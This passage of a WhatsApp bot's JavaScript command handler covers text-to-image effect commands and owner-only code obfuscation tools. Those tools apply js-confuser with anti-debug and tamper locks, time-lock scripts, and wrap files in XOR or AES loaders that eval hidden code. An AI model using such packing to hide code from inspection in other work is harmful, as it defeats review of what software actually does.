                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "neonglitch": {
                if (args.length < 1) return reply("✏️ *Usage:* neonglitch 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/neonglitch?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "💥 *Neon Glitch*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "flagtext": {
                if (args.length < 1) return reply("✏️ *Usage:* flagtext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/flagtext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🇳🇬 *Flag Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "flag3dtext": {
                if (args.length < 1) return reply("✏️ *Usage:* flag3dtext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/flag3dtext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🇺🇸 *3D Flag Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "deletingtext": {
                if (args.length < 1) return reply("✏️ *Usage:* deletingtext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/deletingtext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🩶 *Deleting Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "blackpinkstyle": {
                if (args.length < 1) return reply("✏️ *Usage:* blackpinkstyle 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/blackpinkstyle?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🎀 *Blackpink Style*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "glowingtext": {
                if (args.length < 1) return reply("✏️ *Usage:* glowingtext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/glowingtext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "💫 *Glowing Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "underwatertext": {
                if (args.length < 1) return reply("✏️ *Usage:* underwatertext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/underwatertext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🌊 *Underwater Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "logomaker": {
                if (args.length < 1) return reply("✏️ *Usage:* logomaker 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/logomaker?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🐻 *Logo Maker*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "cartoonstyle": {
                if (args.length < 1) return reply("✏️ *Usage:* cartoonstyle 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/cartoonstyle?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🎨 *Cartoon Style*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    reply("⚠️ *Error generating*");
                }
            }
                break;

            case "papercutstyle": {
                if (args.length < 1) return reply("✏️ *Usage:* papercutstyle 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/papercutstyle?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "✂️ *Paper Cut Style*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Paper Cut Style*");
                }
            }
                break;

            case "watercolortext": {
                if (args.length < 1) return reply("✏️ *Usage:* watercolortext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/watercolortext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🖌️ *Watercolor Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Watercolor Text*");
                }
            }
                break;

            case "effectclouds": {
                if (args.length < 1) return reply("✏️ *Usage:* effectclouds 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/effectclouds?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "☁️ *Clouds Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Cloud Text*");
                }
            }
                break;

            case "blackpinklogo": {
                if (args.length < 1) return reply("✏️ *Usage:* blackpinklogo 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/blackpinklogo?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "💖 *Blackpink Logo*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Blackpink Logo*");
                }
            }
                break;

            case "gradienttext": {
                if (args.length < 1) return reply("✏️ *Usage:* gradienttext Robin");

                try {
                    let url = `https://apis.prexzyvilla.site/gradienttext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🌈 *Gradient Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Gradient Text*");
                }
            }
                break;

            case "summerbeach": {
                if (args.length < 1) return reply("✏️ *Usage:* summerbeach 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/summerbeach?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🏖️ *Summer Beach Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Summer Beach Text*");
                }
            }
                break;

            case "luxurygold": {
                if (args.length < 1) return reply("✏️ *Usage:* luxurygold 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/luxurygold?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🥇 *Luxury Gold Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Luxury Gold Text*");
                }
            }
                break;

            case "multicoloredneon": {
                if (args.length < 1) return reply("✏️ *Usage:* multicoloredneon 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/multicoloredneon?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🌈 *Multicolored Neon*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Multicolored Neon*");
                }
            }
                break;

            case "sandsummer": {
                if (args.length < 1) return reply("✏️ *Usage:* sandsummer 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/sandsummer?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🏖️ *Sand Summer Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Sand Summer Text*");
                }
            }
                break;

            case "galaxywallpaper": {
                if (args.length < 1) return reply("✏️ *Usage:* galaxywallpaper 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/galaxywallpaper?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🌌 *Galaxy Wallpaper*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Galaxy Wallpaper*");
                }
            }
                break;

            case "style1917": {
                if (args.length < 1) return reply("✏️ *Usage:* style1917 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/style1917?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🎖️ *1917 Style Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating 1917 Style Text*");
                }
            }
                break;

            case "makingneon": {
                if (args.length < 1) return reply("✏️ *Usage:* makingneon 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/makingneon?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🌠 *Making Neon*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Making Neon*");
                }
            }
                break;

            case "royaltext": {
                if (args.length < 1) return reply("✏️ *Usage:* royaltext 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/royaltext?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "👑 *Royal Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Royal Text*");
                }
            }
                break;

            case "freecreate": {
                if (args.length < 1) return reply("✏️ *Usage:* freecreate 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/freecreate?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🧊 *3D Hologram Text*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Free Create Text*");
                }
            }
                break;

            case "galaxystyle": {
                if (args.length < 1) return reply("✏️ *Usage:* galaxystyle 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/galaxystyle?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "🪐 *Galaxy Style Logo*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Galaxy Style Logo*");
                }
            }
                break;

            case "lighteffects": {
                if (args.length < 1) return reply("✏️ *Usage:* lighteffects 𝗦𝗔𝗟𝗔𝗥 𝗫 𝗠𝗗");

                try {
                    let url = `https://apis.prexzyvilla.site/lighteffects?text=${encodeURIComponent(args.join(" "))}`;
                    await devtrust.sendMessage(from,
                        addNewsletterContext({
                            image: { url },
                            caption: "💡 *Light Effects*"
                        }),
                        { quoted: m }
                    );
                } catch (e) {
                    console.error(e);
                    reply("⚠️ *Error generating Light Effects*");
                }
            }
                break;
case 'encjs': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getBaseConfig, 'encjs', addNewsletterContext);
} break;
case 'strong': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getStrongObfuscationConfig, 'strong', addNewsletterContext);
} break;
case 'bigstro': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getBigObfuscationConfig, 'bigstro', addNewsletterContext);
} break;
case 'invis':
case 'norinv': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getInvisibleObfuscationConfig, command, addNewsletterContext);
} break;
case 'quantum': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, obfuscateQuantum, 'quantum', addNewsletterContext);
} break;
case 'varenc': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getVarObfuscationConfig, 'varenc', addNewsletterContext);
} break;
case 'yuienc': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getNebulaObfuscationConfig, 'yuienc', addNewsletterContext);
} break;
case 'nova': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getNovaObfuscationConfig, 'nova', addNewsletterContext);
} break;
case 'japan': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getJapanObfuscationConfig, 'japan', addNewsletterContext);
} break;
case 'japxar': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getJapanxArabObfuscationConfig, 'japxar', addNewsletterContext);
} break;
case 'siucal': {
  if (!isCreator) return reply('🔒 *Owner only*');
  await processEncWA(m, devtrust, getSiuCalcrickObfuscationConfig, 'siucal', addNewsletterContext);
} break;
case 'custom': {
  if (!isCreator) return reply('🔒 *Owner only*');
  if (!text) {
    return await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❌ Format: *.custom <name>*\nExample: *.custom MyScript*` }),
      { quoted: m }
    );
  }
  const customName = text.trim().replace(/\s+/g, '_');
  await processEncWA(m, devtrust, () => getCustomObfuscationConfig(customName), `custom_${customName}`, addNewsletterContext);
} break;
case 'timelocked': {
  if (!isCreator) return reply('🔒 *Owner only*');
  const days = parseInt(args[0]);
  if (!args[0] || isNaN(days) || days < 1 || days > 365) {
    return await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❌ Format: *.timelocked <1-365>*\nExample: *.timelocked 30*` }),
      { quoted: m }
    );
  }
  if (!JsConfuser) {
    return await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❌ Module *js-confuser* belum terinstall di server.` }),
      { quoted: m }
    );
  }
  const quoted = m.quoted || m;
  const fileName = quoted?.msg?.fileName || 'file.js';
  const isDoc = quoted?.mtype === 'documentMessage' || fileName.endsWith('.js');
  if (!isDoc || !fileName.endsWith('.js')) {
    return await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❌ Reply to a *.js* file with *.timelocked <days>*` }),
      { quoted: m }
    );
  }
  await devtrust.sendMessage(m.chat,
    addNewsletterContext({ text: `🔒 *EncryptBot*\n⏳ Processing Time-Lock (${days} days)...` }),
    { quoted: m }
  );
  const tmpPath = path.join('./tmp', `timelocked_${days}d_${Date.now()}.js`);
  try {
    const fileContent = await downloadWADocument(m, devtrust);
    const obfCode = await runObfuscateWorker({ methodName: 'timelocked', fileContent, days });
    fsx.writeFileSync(tmpPath, obfCode);
    const expireDate = new Date(Date.now() + days * 24 * 60 * 60 * 1000)
      .toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' });
    await devtrust.sendMessage(m.chat,
      addNewsletterContext({
        document: fsx.readFileSync(tmpPath),
        mimetype: 'application/javascript',
        fileName: `timelocked_${days}d_${fileName}`,
        caption: `✅ *Encrypted file (Time-Locked) ready!*\n⏰ Expires: *${expireDate}* (${days} days)`,
      }),
      { quoted: m }
    );
    fsx.removeSync(tmpPath);
  } catch (error) {
    await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❌ *Error:* ${error.message}` }),
      { quoted: m }
    );
    if (fsx.existsSync(tmpPath)) fsx.removeSync(tmpPath);
  }
} break;
case 'enchtml': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const quoted = m.quoted || m;
    const fileName = quoted?.msg?.fileName || '';
    const isDoc = quoted?.mtype === 'documentMessage';
    if (!isDoc) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❗ Reply to an *.html* file with *.enchtml*` }),
            { quoted: m }
        );
    }
    if (!fileName.match(/\.html?$/i)) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❗ File must have an *.html* extension` }),
            { quoted: m }
        );
    }
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔐 _Encrypting HTML (hardened)..._` }),
        { quoted: m }
    );
    const tmpOut = path.join('./tmp', `enc_html_${Date.now()}.html`);
    try {
        const html = await downloadWADocument(m, devtrust);

        // Multi-layer key derivation: random master key -> per-byte rotating key
        const masterKey = crypto.randomBytes(32).toString('hex');
        const salt = crypto.randomBytes(8).toString('hex');
        const derivedKey = crypto.createHash('sha256').update(masterKey + salt).digest('hex');

        const b64 = Buffer.from(html, 'utf-8').toString('base64');
        let xored = '';
        for (let i = 0; i < b64.length; i++) {
            const k = derivedKey.charCodeAt(i % derivedKey.length) ^ ((i * 31) & 0xff);
            xored += String.fromCharCode(b64.charCodeAt(i) ^ k);
        }
        const final64 = Buffer.from(xored, 'binary').toString('base64');

        // Decryptor logic is generated as raw JS, then obfuscated with
        // anti-debug / integrity locks before being embedded in the HTML.
        const decryptorSrc = `
(function(){
var _m="${masterKey}",_s="${salt}",_d="${final64}";
function _sha256hex(s){
  // minimal sha256 (sync, no deps) - WebCrypto fallback
  return crypto.subtle.digest('SHA-256', new TextEncoder().encode(s)).then(function(buf){
    return Array.prototype.map.call(new Uint8Array(buf), function(b){return ('0'+b.toString(16)).slice(-2);}).join('');
  });
}
_sha256hex(_m+_s).then(function(_k){
  try{
    var b=atob(_d),x="";
    for(var i=0;i<b.length;i++){
      var kc=_k.charCodeAt(i%_k.length) ^ ((i*31)&0xff);
      x+=String.fromCharCode(b.charCodeAt(i)^kc);
    }
    var h=atob(x);
    document.open();document.write(h);document.close();
  }catch(e){document.write('Decryption error');}
}).catch(function(){document.write('Unsupported environment');});
})();`;

        let hardenedScript = decryptorSrc;
        if (typeof safeObfuscate === 'function' && JsConfuser) {
            try {
                const obf = await safeObfuscate(decryptorSrc, {
                    target: 'browser',
                    compact: true,
                    renameVariables: true,
                    stringEncoding: true,
                    stringConcealing: true,
                    controlFlowFlattening: 1,
                    deadCode: true,
                    opaquePredicates: true,
                    dispatcher: true,
                    globalConcealing: true,
                    hexadecimalNumbers: true,
                    lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
                });
                hardenedScript = obf.code || obf || decryptorSrc;
            } catch (_) { /* fallback to non-obfuscated decryptor if it fails */ }
        }

        const template = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Protected</title>
<style>body{background:#0d0d0d;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}.box{text-align:center}</style>
</head><body>
<div class="box"><p>🔐 Decrypting...</p></div>
<script>${hardenedScript}</script>
</body></html>`;

        fsx.writeFileSync(tmpOut, template);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: fsx.readFileSync(tmpOut),
                mimetype: 'text/html',
                fileName: `enc_${fileName}`,
                caption: `✅ *HTML Encrypted (Hardened)*\n📄 ${fileName}\n🔐 Salted XOR + SHA-256 + Obfuscated decryptor`,
            }),
            { quoted: m }
        );
    } catch (e) {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ ${e.message}` }),
            { quoted: m }
        );
    } finally { fsx.removeSync(tmpOut); }
} break;

case 'enchard': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const quoted = m.quoted || m;
    const isDoc = quoted?.mtype === 'documentMessage';
    if (!isDoc) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❗ Reply to the file you want to encrypt with *.enchard*` }),
            { quoted: m }
        );
    }
    const fileName = quoted?.msg?.fileName || 'file.js';
    const ext = path.extname(fileName);
    const tmpOut = path.join('./tmp', `xor_${Date.now()}${ext}`);
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔐 _XOR+Base64 Encrypting (hardened)..._` }),
        { quoted: m }
    );
    try {
        const raw = await downloadWADocument(m, devtrust);
        const key = crypto.randomBytes(32).toString('hex');
        const salt = crypto.randomBytes(8).toString('hex');

        let xored = '';
        for (let i = 0; i < raw.length; i++) {
            const k = key.charCodeAt(i % key.length) ^ salt.charCodeAt(i % salt.length) ^ ((i * 17) & 0xff);
            xored += String.fromCharCode(raw.charCodeAt(i) ^ k);
        }
        const enc = Buffer.from(xored, 'binary').toString('base64');

        let output;
        if (ext === '.js') {
            const loaderSrc = `;(function(){var _k="${key}",_s="${salt}",_e="${enc}";var b=Buffer.from(_e,'base64').toString('binary'),x="";for(var i=0;i<b.length;i++){var kc=_k.charCodeAt(i%_k.length)^_s.charCodeAt(i%_s.length)^((i*17)&0xff);x+=String.fromCharCode(b.charCodeAt(i)^kc);}eval(x);})();`;

            let hardenedLoader = `// XOR Encrypted (hardened)\n${loaderSrc}`;
            if (JsConfuser) {
                try {
                    const obf = await safeObfuscate(loaderSrc, {
                        target: 'node',
                        compact: true,
                        renameVariables: true,
                        stringEncoding: true,
                        stringConcealing: true,
                        controlFlowFlattening: 1,
                        deadCode: true,
                        opaquePredicates: true,
                        dispatcher: true,
                        globalConcealing: true,
                        hexadecimalNumbers: true,
                        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
                    });
                    hardenedLoader = `// XOR Encrypted (hardened)\n${obf.code || obf || loaderSrc}`;
                } catch (_) { /* fallback to non-obfuscated loader */ }
            }
            output = hardenedLoader;
        } else {
            output = `/* KEY:${key} */\n/* SALT:${salt} */\n/* ENC:${enc} */`;
        }

        fsx.writeFileSync(tmpOut, output);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: fsx.readFileSync(tmpOut),
                mimetype: 'application/octet-stream',
                fileName: `xor_${fileName}`,
                caption: `✅ *XOR Encrypt Done (Hardened)*\n📄 ${fileName}\n🔐 Salted XOR-256 + Obfuscated loader`,
            }),
            { quoted: m }
        );
    } catch (e) {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ ${e.message}` }),
            { quoted: m }
        );
    } finally { fsx.removeSync(tmpOut); }
} break;

case 'encaes': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const quoted = m.quoted || m;
    const isDoc = quoted?.mtype === 'documentMessage';
    if (!isDoc) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❗ Reply to the file you want to encrypt with *.encaes [passphrase]*` }),
            { quoted: m }
        );
    }
    const fileName = quoted?.msg?.fileName || 'file.js';
    const ext = path.extname(fileName);
    const passphrase = text?.trim() || crypto.randomBytes(16).toString('hex');
    const tmpOut = path.join('./tmp', `aes_${Date.now()}${ext}`);
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔐 _AES-256-GCM Encrypting (hardened)..._` }),
        { quoted: m }
    );
    try {
        const raw = await downloadWADocument(m, devtrust);
        const iv = crypto.randomBytes(12); // GCM standard IV size
        const salt = crypto.randomBytes(16);
        const aesKey = crypto.scryptSync(passphrase, salt, 32);

        const cipher = crypto.createCipheriv('aes-256-gcm', aesKey, iv);
        let enc = cipher.update(raw, 'utf-8', 'base64');
        enc += cipher.final('base64');
        const authTag = cipher.getAuthTag().toString('hex');

        const result = JSON.stringify({
            iv: iv.toString('hex'),
            salt: salt.toString('hex'),
            tag: authTag,
            data: enc,
            file: fileName
        });

        let output;
        if (ext === '.js') {
            const loaderSrc = `const _AES=require('crypto');(function(){var _d=${JSON.stringify(result)},_p=${JSON.stringify(passphrase)};var o=JSON.parse(_d),k=_AES.scryptSync(_p,Buffer.from(o.salt,'hex'),32),c=_AES.createDecipheriv('aes-256-gcm',k,Buffer.from(o.iv,'hex'));c.setAuthTag(Buffer.from(o.tag,'hex'));var dec=c.update(o.data,'base64','utf8')+c.final('utf8');eval(dec);})();`;

            let hardenedLoader = `// AES-256-GCM Encrypted (hardened)\n${loaderSrc}`;
            if (JsConfuser) {
                try {
                    const obf = await safeObfuscate(loaderSrc, {
                        target: 'node',
                        compact: true,
                        renameVariables: true,
                        stringEncoding: true,
                        stringConcealing: true,
                        controlFlowFlattening: 1,
                        deadCode: true,
                        opaquePredicates: true,
                        dispatcher: true,
                        globalConcealing: true,
                        hexadecimalNumbers: true,
                        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
                    });
                    hardenedLoader = `// AES-256-GCM Encrypted (hardened)\n${obf.code || obf || loaderSrc}`;
                } catch (_) { /* fallback to non-obfuscated loader */ }
            }
            output = hardenedLoader;
        } else {
            output = result;
        }

        fsx.writeFileSync(tmpOut, output);
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({
                document: fsx.readFileSync(tmpOut),
                mimetype: 'application/octet-stream',
                fileName: `aes_${fileName}`,
                caption: `✅ *AES-256-GCM Encrypt Done (Hardened)*\n📄 ${fileName}\n🔐 AES-256-GCM (authenticated) + Obfuscated loader\n🔑 Passphrase: \`${passphrase}\`\n⚠️ Save this passphrase — it's required to decrypt!`,
            }),
            { quoted: m }
        );
    } catch (e) {
        await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❌ ${e.message}` }),
            { quoted: m }
        );
    } finally { fsx.removeSync(tmpOut); }
} break;
case 'locked': {
    if (!isCreator) return reply('🔒 *Owner only*');
    if (!text) {
        return await devtrust.sendMessage(m.chat,
            addNewsletterContext({ text: `❗ Example: *.locked hello world*` }),
            { quoted: m }
        );
    }
    const locked = text.split('').map(c => {
        const code = c.charCodeAt(0);
        return (code >= 32 && code <= 126) ? String.fromCharCode(code + 0xFEE0) : c;
    }).join('');
    await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `🔒 *Locked Text*\n\n${locked}` }),
        { quoted: m }
    );
} break;
case 'chinaenc': {
  if (!isCreator) return reply('🔒 *Owner only*');
  const quotedMsg = m.quoted || m;
  if (quotedMsg?.mtype === 'documentMessage') {
    await processEncWA(m, devtrust, getMandarinObfuscationConfig, 'chinaenc', addNewsletterContext);
  } else {
    const t = m.quoted?.text || m.quoted?.caption || text;
    if (!t) {
      return await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `❗ Reply to a text or *.js* file to cipher/obfuscate!` }),
        { quoted: m }
      );
    }
    const chinaBase = 0x4E00;
    const result = t.split('').map(c => {
      const code = c.charCodeAt(0);
      return (code >= 32 && code <= 126) ? String.fromCharCode(chinaBase + (code - 32)) : c;
    }).join('');
    await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `🐉 *China Cipher*\n\n${result}` }),
      { quoted: m }
    );
  }
} break;
case 'arabenc': {
  if (!isCreator) return reply('🔒 *Owner only*');
  const quotedMsg = m.quoted || m;
  if (quotedMsg?.mtype === 'documentMessage') {
    await processEncWA(m, devtrust, getArabObfuscationConfig, 'arabenc', addNewsletterContext);
  } else {
    const t = m.quoted?.text || m.quoted?.caption || text;
    if (!t) {
      return await devtrust.sendMessage(m.chat,
        addNewsletterContext({ text: `❗ Reply to a text or *.js* file!` }),
        { quoted: m }
      );
    }
    const arabChars = ['ا','ب','ت','ث','ج','ح','خ','د','ذ','ر','ز','س','ش','ص','ض','ط','ظ','ع','غ','ف','ق','ك','ل','م','ن','ه','و','ي'];
    const result = t.split('').map(c => {
      const code = c.toLowerCase().charCodeAt(0) - 97;
      return (code >= 0 && code < 28) ? arabChars[code] : c;
    }).join('');
    await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `🕌 *Arab Cipher*\n\n${result}` }),
      { quoted: m }
    );
  }
} break;
case 'japanenc': {
  if (!isCreator) return reply('🔒 *Owner only*');
  const t = m.quoted?.text || m.quoted?.caption || text;
  if (!t) {
    return await devtrust.sendMessage(m.chat,
      addNewsletterContext({ text: `❗ Reply to the text you want to cipher!` }),
      { quoted: m }
    );
  }
  const japanChars = ['あ','い','う','え','お','か','き','く','け','こ','さ','し','す','せ','そ','た','ち','つ','て','と','な','に','ぬ','ね','の','は','ひ','ふ','へ','ほ','ま','み','む','め','も','や','ゆ','よ','ら','り','る','れ','ろ','わ','を','ん'];
  const result = t.split('').map(c => {
    const code = c.toLowerCase().charCodeAt(0) - 97;
    return (code >= 0 && code < 46) ? japanChars[code] : c;
  }).join('');
  await devtrust.sendMessage(m.chat,
    addNewsletterContext({ text: `🗾 *Japan Cipher*\n\n${result}` }),
    { quoted: m }
  );
} break;
case 'deobfuscate':
case 'deobf': {
    if (!isCreator) return reply('🔒 *Owner only*');
    const quoted = m.quoted || m;
